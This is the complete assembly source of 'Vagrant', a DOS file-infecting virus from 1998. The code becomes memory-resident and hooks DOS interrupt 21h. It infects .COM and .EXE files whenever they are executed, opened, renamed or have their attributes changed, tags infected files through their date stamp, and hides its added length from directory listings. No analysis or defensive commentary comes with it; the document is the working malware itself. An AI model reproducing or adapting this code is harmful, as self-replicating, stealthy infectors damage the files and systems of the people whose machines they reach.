; Starting Banner - Vagrant Virus       " Liu Lang Han Bing Du "
; Developped : DanSei
; Dec.26, 1998  ALL RIGHTS RESERVED.

        .286
        .Model Tiny
        .Code
        Org     100h

Vagrant Proc    Far
Start:
        Call    VMain
Vagrant Endp

VMain   Proc    Near
        Pop     Si
        Sub     Si, 3
        Push    AX
        Mov     AX, 30CDh
        Int     21h
        Cmp     AX, 6701h
        Jz      Restore1
        Call    InfectM
Restore1:
        Pop     AX
        Add     SI, Offset ProgramSave - 100h
        Cmp     Word Ptr CS: [SI], 5A4Dh        ; 'MZ'
        Jz      Restore_EXE
        Mov     DI, 100h
        Push    DI
        Movsw
        Movsb
        Retn
Restore_EXE:
        Mov     CX, DS
        Add     CX, 10h
        Mov     DX, CX
        Add     DX, CS: [SI + 0Eh]              ; SI = ProgramSave Area
        Cli
        Mov     SS, DX
        Mov     SP, CS: [SI + 10h]
        Sti
        Add     CX, CS: [SI + 16h]
        Push    CX
        Push    Word Ptr CS: [SI + 14h]
        Retf
VMain   Endp

DOS     Proc    Near
        Pushf
        Clc
        Call    DWord Ptr CS: Int21Off - 100h
        Retn
DOS     Endp

L_DOS:
        Clc
        Cli
        Jmp     DWord Ptr CS: Int21Off - 100h

V_ID:
        Mov     AX, 6701h
V_SucRet:
        Clc
V_Ret:
        Retf    2                               ; Keep Flag Unchanged

V_Int21:                                        ; Vagrant Int 21h
        Cmp     AX, 30CDh                       ; Check
        Jz      V_ID
        Cmp     AH, 4Eh
        Jz      V_Find
        Cmp     AH, 4Fh
        Jnz     V_L_1
V_Find:                                         ; Find Files
        Call    DOS
        Jc      V_Ret
V_Find_ReportSize:
        Push    AX
        Push    ES
        Push    BX
        Mov     AH, 2Fh
        Call    DOS
        Test    Word Ptr ES: [BX + 18h], 8000h  ; Infected ID: Data.Year + 100
        Jz      V_Find_Exit
        Sub     Word Ptr ES: [BX + 1Ah], Offset VagrantLength
        Sbb     Word Ptr ES: [BX + 1Ch], 0      ; Sub VLen from File Size
V_Find_Exit:
        Pop     BX
        Pop     ES
        Pop     AX
        Jmp     Short V_SucRet
V_L_1:
        Cmp     AH, 11h
        Jz      V_FindFCB
        Cmp     AH, 12h
        Jnz     V_L_2
V_FindFCB:                                      ; Find Files Using FCB
        Call    DOS
        Or      AL, AL                          ; AL = FF if Failed
        Jnz     V_Ret
        Jmp     Short V_Find_ReportSize
V_L_2:
        Cmp     AX, 4B00h                       ; Execute File
        Jz      L_Infect
        Cmp     AH, 3Dh                         ; Open File
        Jz      L_Infect
        Cmp     AH, 43h                         ; Change File Mode
        Jz      L_Infect
        Cmp     AH, 56h                         ; Rename File
        Jnz     V_Int21_Exit
L_Infect:
        Call    FileOK
        Jnz     V_Int21_Exit
        Call    Infect
V_Int21_Exit:
        Jmp     Short L_DOS

FileOK  Proc    Near                            ; Check if The Right File
        Push    AX
        Push    SI
        Mov     SI, DX                          ; DS:SI -> File Name
        Cld
L_SExt:
        Lodsb
        Or      AL, AL
        Jz      NotThis
        Cmp     AL, '.'
        Jnz     L_SExt
        Lodsw
        And     AX, 0DFDFh
        Cmp     AX, 'OC'
        Jnz     L_Ext_EXE
        Lodsb
        And     AL, 0DFh
        Cmp     AL, 'X'
        Jmp     Short FileOK_Exit
L_Ext_EXE:
        Cmp     AX, 'XE'
        Jnz     FileOK_Exit
        Lodsb
        And     AL, 0DFh
        Cmp     AL, 'X'
FileOK_Exit:
        Pop     SI
        Pop     AX
        Retn
NotThis:
        Lahf
        And     AH, 10111111b                   ; Clear ZF
        Sahf
        Jmp     Short FileOK_Exit
FileOK  Endp

Infect  Proc    Near
        PushA                                   ; AX BX CX DX SI
        Push    DS
        Push    ES
        Mov     AX, 3524h                       ; Save Old Int 24h
        Call    DOS                             ; ( Critical Error Handler )
        Push    ES
        Push    BX
        Push    DS                              ; Set New Int 24h
        Push    DX
        Push    CS
        Pop     DS
        Mov     AH, 25h
        Mov     DX, Offset V_Int24 - 100h
        Call    DOS
        Pop     DX
        Pop     DS
        Mov     SI, DX
        Mov     AX, 121Ah                       ; Get File DS:SI's Disk in AL
        Int     2Fh
        Mov     Byte Ptr CS: FileDisk - 100h, AL
        Mov     AX, 4300h                       ; Get File Mode
        Call    DOS
        Jc      Infect_Exit
        Test    CL, 1Ch                         ; RRArrsHR
        Jnz     Infect_Exit
        Push    CX
        Mov     AX, 4301h                       ; Set File Mode
        Xor     CX, CX
        Call    DOS
        Jc      Infect_Exit_PopCX
        Mov     AX, 3D02h                       ; Open, R/W
        Call    DOS
        Jc      Restore_Mode
        Mov     BX, AX                          ; File Handle
        Push    DS
        Push    DX
        Push    CS
        Pop     DS
        Push    CS
        Pop     ES
        Call    Infect2
        Pop     DX
        Pop     DS
        Mov     AH, 3Eh                         ; Close
        Call    DOS
Restore_Mode:
        Pop     CX
        Mov     AX, 4301h                       ; Set File Mode
        Call    DOS
Infect_Exit:
        Pop     DX
        Pop     DS
        Mov     AX, 2524h                       ; Restore Int 24h
        Call    DOS
        Pop     ES
        Pop     DS
        PopA                                    ; SI DX CX BX AX
        Retn
Infect_Exit_PopCX:
        Pop     CX
        Jmp     Short Infect_Exit
Infect  Endp

Infect2 Proc    Near
        Mov     AX, 5700h                       ; Get File Date(DX) & Time(CX)
        Call    DOS
        Mov     Word Ptr FileDate - 100h, DX
        Mov     Word Ptr FileTime - 100h, CX
        Mov     AX, 4202h                       ; Seek from End
        Mov     CX, -1
        Mov     DX, -7
        Call    DOS
        Jc      Infect_Return
        Push    SI
        Push    DI
        Mov     AH, 3Fh                         ; Read, Return Bytes in AX
        Mov     DX, Offset Buffer - 100h        ; Fixup
        Mov     DI, DX
        Mov     CX, 7
        Call    DOS
        Mov     SI, Offset IDString - 100h
        Rep     Cmpsb                           ; Check if Infected
        Pop     DI
        Pop     SI
        Jnz     CheckSpace
        Jmp     Infect_ID                       ; Sign Date ID
CheckSpace:
        Push    BX
        Mov     AH, 36h                         ; Get Disk Free Space
        Mov     DL, Byte Ptr FileDisk - 100h    ; AX = Sec / Clus
        Call    DOS                             ; BX = Free Clus
        Mul     BX                              ; CX = Byte / Sec
        Pop     BX                              ; DX = Clus / Disk
        Or      DX, DX
        Jnz     Infect3
        Cmp     AX, 1
        Ja      Infect3
Infect_Return:
        Retn
Infect3:
        Xor     CX, CX
        Xor     DX, DX
        Mov     AX, 4200h                       ; Seek from Begin
        Call    DOS
        Mov     AH, 3Fh                         ; Read
        Mov     CX, 1Ch                         ; 1Ch Mainly for .EXE File
        Mov     DX, Offset Buffer - 100h
        Call    DOS
        Jc      Infect_Return
        Mov     AX, 4202h                       ; Seek from End
        Xor     CX, CX
        Xor     DX, DX
        Call    DOS                             ; DX:AX = File Length
        Cmp     Word Ptr Buffer - 100h, 5A4Dh          ; Is EXE File?
        Jz      Infect_EXE1
        Cmp     AX, 400h                        ; File Size > 1024 ?
        Jb      Infect_Return
        Cmp     AX, 0F000h
        Jbe     Infect4
        Jmp     Short Infect_Return
Infect_EXE1:
        Push    AX
        Push    DX
        Mov     CX, 200h                        ; 512 Pages
        Div     CX
        Inc     AX                              ; AX = 512 Pages, DX = Rem
        Cmp     AX, Word Ptr Buffer - 100h + 4
        Jnz     V_L_3
        Cmp     DX, Word Ptr Buffer - 100h + 2
V_L_3:
        Pop     DX
        Pop     AX
        Jnz     Infect_Return
Infect4:                                        ; Append Virus to File's End
        Push    AX
        Push    DX
        Mov     AH, 40h                         ; Write DS:DX * CX Bytes to File
        Xor     DX, DX
        Mov     CX, Offset VagrantLength
        Call    DOS
        Pop     DX
        Pop     AX
        Jc      Infect_Return
        Cmp     Word Ptr Buffer - 100h, 5A4Dh   ; Is EXE File?
        Jz      Infect_EXE2
        Mov     Byte Ptr Buffer - 100h, 0E9h    ; Jmp Near
        Sub     AX, 3
        Mov     Word Ptr Buffer - 100h + 1, AX  ; Relative Address
        Jmp     Short Infect5
Infect_EXE2:
        Push    AX
        Push    DX
        Add     AX, Offset VagrantLength
        Adc     DX, 0
        Mov     CX, 200h
        Div     CX
        Inc     AX
        Mov     Word Ptr Buffer - 100h + 4, AX
        Mov     Word Ptr Buffer - 100h + 2, DX
        Pop     DX
        Pop     AX
        Mov     SI, Word Ptr Buffer - 100h + 8  ; Header Size / 10h
        Mov     CL, 4
        Shl     SI, CL
        Sub     AX, SI                          ; File Size - Header Size
        Sbb     DX, 0
        Mov     CX, 10
        Div     CX
        Mov     Word Ptr Buffer - 100h + 16h, AX        ; CS +
        Mov     Word Ptr Buffer - 100h + 14h, DX        ; IP
        Mov     Word Ptr Buffer - 100h + 0Eh, AX        ; SS +
        Mov     Word Ptr Buffer - 100h + 10h, 1000h     ; SP
Infect5:
        Mov     AX, 4200h                       ; Seek to Begin
        Xor     CX, CX
        Xor     DX, DX
        Call    DOS
        Mov     AH, 40h                         ; Write
        Mov     CX, 1Ch
        Mov     DX, Offset Buffer - 100h        ; EXE File Header
        Call    DOS
Infect_ID:
        Mov     DX, Word Ptr FileDate - 100h
        Mov     CX, Word Ptr FileTime - 100h
        Test    DX, 8000h
        Jnz     WriteDate
ModifyDate:
        Add     DX, 0C800h
WriteDate:
        Mov     AX, 5701h                       ; Set File Date & Time
        Call    DOS
        Retn
Infect2 Endp

InfectM Proc    Near
        Push    SI
        Push    DS
        Push    ES
        Mov     AX, ES                          ; Adjust Memory Blocks
        Dec     AX
        Mov     ES, AX
        Mov     BX, 3
        Sub     Word Ptr ES: [BX], 3Ch          ; MCB Size
        Dec     BX
        Mov     AX, [BX]
        Sub     AX, 3Ch
        Mov     [BX], AX                        ; Top of Memory
        Mov     ES, AX
        Push    CS                              ; Move Vagrant Codes
        Pop     DS
        Xor     DI, DI
        Mov     CX, Offset VagrantLength
        Rep     Movsb
        Push    ES                              ; Modify Interrupt Table
        Pop     DS
        Mov     AX, 3521h
        Int     21h
        Mov     Int21Off - 100h, BX
        Mov     Int21Seg - 100h, ES
        Mov     DX, Offset V_Int21 - 100h
        Mov     AH, 25h
        Int     21h
        Pop     ES
        Pop     DS
        Pop     SI
        Retn
InfectM Endp

V_Int24:
        Mov     AL, 3                           ; ( Fail System Calls )
        Iret

        ProgramSave     DB 0CDh, 20h, 0

        IDString        DB 'VAGRANT'

        Buffer          DB 20h Dup (0)

        VagrantLength   = $ - 100h

        Int21Off        DW 0
        Int21Seg        DW 0

        FileDisk        DB 0
        FileDate        DW 0
        FileTime        DW 0

        End     Start
